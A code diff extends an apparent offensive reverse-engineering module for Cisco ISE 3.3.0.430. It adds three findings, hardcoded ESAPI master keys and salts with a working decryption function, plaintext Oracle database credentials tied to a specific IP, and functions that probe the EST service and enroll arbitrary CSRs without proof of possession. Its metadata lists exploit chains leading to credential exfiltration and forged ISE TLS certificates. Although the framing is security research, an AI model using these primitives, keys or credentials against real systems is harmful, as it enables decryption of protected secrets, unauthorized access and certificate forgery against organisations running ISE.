@@ -59,6 +59,9 @@ ISE-F40: CA REST API on HTTP port 9444 (Tomcat Connector: no address bind → 0.
 ISE-F42: Unauthenticated OCSP cert reload — GET /ocsp/update on port 2560 (network-accessible via cpmadjustfw.sh enable_ocsp_port); Jersey OcspRestServer.update() calls OcspServlet.load() to reload OCSP server cert+key from CA; no auth (no web.xml security-constraint, no @RolesAllowed); allows external actor to force OCSP cert state reload [MEDIUM]
 ISE-F43: simple-config.xml hardcoded Cisco dev cert + encrypted private key — /opt/CSCOcpm/prrt/bin/simple-config.xml ships in ISE 3.3.0 RPM; contains ACS cert for tkrpis1.cisco.com (2021-2023, expired) + PKCS#8 encrypted private key + hardcoded 48-byte binary decryption password all in same file; key_material pattern: password stored alongside ciphertext [LOW]
 ISE-F44: Hermes (pxGrid Cloud Agent) container mounts -v /var/run/:/host/var/run/ — bridge network hermes-network (169.254.7.0/24), --cap-drop=all, --read-only, -p 127.0.0.1:8913:8913/tcp; key_manager.sock accessible at /host/var/run/ from container; extends ISE-F39/F11 pattern to third ISE container [HIGH]
+ISE-F45: PSP (Platform Service Provider) ESAPI.properties second hardcoded MasterKey+MasterSalt — MasterKey=a6H9is3hEVGKB4Jut+lOVA== / MasterSalt=SbftnvmEWD5ZHHP+pX3fqugNysc= (AES/CBC/128); distinct from ISE-F23 (main ISE ESAPI key set); decrypts PSP-layer ESAPI-protected values independently; ships in PSP RPM at /opt/CSCOcpm/conf/ESAPI.properties [MEDIUM]
+ISE-F46: PSP oracle.xml hardcoded Cisco dev Oracle credentials seeded into SEC_PIP_MASTER at DB init — DEFAULT_PIP_MASTER SQL inserts Entitlement Repository PIP record with username=bala/password=bala at jdbc:oracle:thin:@131.107.0.23:1521:secdev; credentials stored as plaintext XML in SEC_PIP_PROP column; pattern: SEC_PIP_MASTER stores all PIP credentials as plaintext XML in Oracle DB [LOW]
+ISE-F47: CiscoRA EST server: plain HTTP on port 8084 (listen 8084 default_server est; HTTPS listener on 9443 commented out), Proof of Possession disabled (est_pop off), CRL checking disabled (est_crl off) — certificate enrollment without TLS protection or key ownership verification; est_ise_ca_server=127.0.0.1:9444 (CA REST API ISE-F40); allows enrollment of arbitrary public keys without proving private key possession [MEDIUM]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3439,9 +3442,76 @@ def probe_hermes_service(host: str = HERMES_HOST, port: int = HERMES_PORT) -> di
     return result
 
 
+# ISE-F45: PSP ESAPI second hardcoded MasterKey+MasterSalt
+PSP_ESAPI_MASTER_KEY = "a6H9is3hEVGKB4Jut+lOVA=="
+PSP_ESAPI_MASTER_SALT = "SbftnvmEWD5ZHHP+pX3fqugNysc="
+PSP_ESAPI_ALGORITHM = "AES/CBC/PKCS5Padding"
+PSP_ESAPI_KEY_LENGTH = 128
+
+def decrypt_psp_esapi_value(ciphertext_b64: str) -> bytes:
+    """ISE-F45: Decrypt PSP-layer ESAPI-protected value using hardcoded MasterKey+MasterSalt."""
+    import base64
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+    from Crypto.Hash import SHA1, HMAC
+    master_key = base64.b64decode(PSP_ESAPI_MASTER_KEY)
+    master_salt = base64.b64decode(PSP_ESAPI_MASTER_SALT)
+    key = PBKDF2(master_key, master_salt, dkLen=16, count=1024, prf=lambda p, s: HMAC.new(p, s, SHA1).digest())
+    raw = base64.b64decode(ciphertext_b64)
+    iv = raw[:16]
+    ct = raw[16:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return cipher.decrypt(ct)
+
+# ISE-F46: PSP oracle.xml bala:bala Oracle dev creds in SEC_PIP_MASTER seed
+PSP_PIP_MASTER_URL = "jdbc:oracle:thin:@131.107.0.23:1521:secdev"
+PSP_PIP_MASTER_USER = "bala"
+PSP_PIP_MASTER_PASS = "bala"
+PSP_PIP_MASTER_TABLE = "SEC_PIP_MASTER"
+PSP_PIP_MASTER_PROP_COL = "SEC_PIP_PROP"
+
+# ISE-F47: CiscoRA EST server — plain HTTP, POP disabled, CRL disabled
+CISCO_RA_EST_PORT = 8084
+CISCO_RA_EST_POP_ENABLED = False
+CISCO_RA_EST_CRL_ENABLED = False
+CISCO_RA_CA_BACKEND = "127.0.0.1:9444"
+CISCO_RA_CA_PROFILE = "caEncUserCert"
+
+def probe_cisco_ra_est(host: str, port: int = CISCO_RA_EST_PORT) -> dict:
+    """ISE-F47: Probe CiscoRA EST server on port 8084 (plain HTTP, no POP, no CRL)."""
+    import urllib.request
+    result = {"host": host, "port": port, "tls": False}
+    url = f"http://{host}:{port}/.well-known/est/cacerts"
+    try:
+        req = urllib.request.Request(url, method="GET")
+        req.add_header("Accept", "application/pkcs7-mime")
+        with urllib.request.urlopen(req, timeout=10) as r:
+            result["status"] = r.status
+            result["body_hex"] = r.read(512).hex()
+            result["pop_required"] = False
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+def enroll_cert_est_no_pop(host: str, csr_pem: str, port: int = CISCO_RA_EST_PORT) -> dict:
+    """ISE-F47: Submit CSR via EST without proof of possession (est_pop off)."""
+    import urllib.request
+    import base64
+    url = f"http://{host}:{port}/.well-known/est/simpleenroll"
+    csr_der_b64 = base64.b64encode(csr_pem.encode()).decode()
+    data = csr_der_b64.encode()
+    req = urllib.request.Request(url, data=data, method="POST")
+    req.add_header("Content-Type", "application/pkcs10")
+    try:
+        with urllib.request.urlopen(req, timeout=15) as r:
+            return {"status": r.status, "cert_b64": base64.b64encode(r.read()).decode()}
+    except Exception as e:
+        return {"error": str(e)}
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.21.0",
+    "version": "1.22.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3452,6 +3522,7 @@ MODULE_META = {
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
         "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
+        "ISE-F45", "ISE-F46", "ISE-F47",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40"],
@@ -3459,8 +3530,8 @@ MODULE_META = {
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
              "ISE-F39", "ISE-F44"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
-               "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42"],
-    "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43"],
+               "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42", "ISE-F45", "ISE-F47"],
+    "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43", "ISE-F46"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "key_material": {
         "ise_f2_3des_key": "ASDF asdf 1234 8983 jkla",
@@ -3563,6 +3634,27 @@ MODULE_META = {
         "ise_f44_socket_in_container": "/host/var/run/key_manager.sock",
         "ise_f44_pattern": "Third ISE container with /var/run/ host mount: ISE-F11=EDDA, ISE-F39=mctrust, ISE-F44=hermes",
         "ise_f44_chain": "hermes-RCE -> /host/var/run/key_manager.sock -> ISE-F1 decrypt oracle -> full ISE credential exfil",
+        "ise_f45_file": "/opt/CSCOcpm/conf/ESAPI.properties (PSP module)",
+        "ise_f45_master_key": "a6H9is3hEVGKB4Jut+lOVA==",
+        "ise_f45_master_salt": "SbftnvmEWD5ZHHP+pX3fqugNysc=",
+        "ise_f45_algorithm": "AES/CBC/PKCS5Padding",
+        "ise_f45_key_length": 128,
+        "ise_f45_note": "Second ESAPI key set distinct from ISE-F23 (main ISE ESAPI); decrypts PSP-layer protected values",
+        "ise_f46_table": "SEC_PIP_MASTER",
+        "ise_f46_col": "SEC_PIP_PROP",
+        "ise_f46_url": "jdbc:oracle:thin:@131.107.0.23:1521:secdev",
+        "ise_f46_user": "bala",
+        "ise_f46_pass": "bala",
+        "ise_f46_context": "DEFAULT_PIP_MASTER SQL seed in PSP oracle.xml; inserts Entitlement Repository PIP record at DB init with plaintext creds in XML blob",
+        "ise_f47_port": 8084,
+        "ise_f47_tls": False,
+        "ise_f47_pop": False,
+        "ise_f47_crl": False,
+        "ise_f47_ca_backend": "127.0.0.1:9444",
+        "ise_f47_ca_profile": "caEncUserCert",
+        "ise_f47_endpoints": ["GET /.well-known/est/cacerts", "POST /.well-known/est/simpleenroll", "POST /.well-known/est/simplereenroll"],
+        "ise_f47_impact": "Certificate enrollment over plain HTTP without key ownership verification; enroll arbitrary public key as ISE cert",
+        "ise_f47_chain": "ISE-F47 (EST no-POP enroll) -> ISE-F40 (CA REST API sign) -> forge ISE-issued TLS cert",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3630,5 +3722,8 @@ MODULE_META = {
         "trigger_ocsp_cert_reload",
         "decode_simple_config_key_password",
         "probe_hermes_service",
+        "decrypt_psp_esapi_value",
+        "probe_cisco_ra_est",
+        "enroll_cert_est_no_pop",
     ],
 }
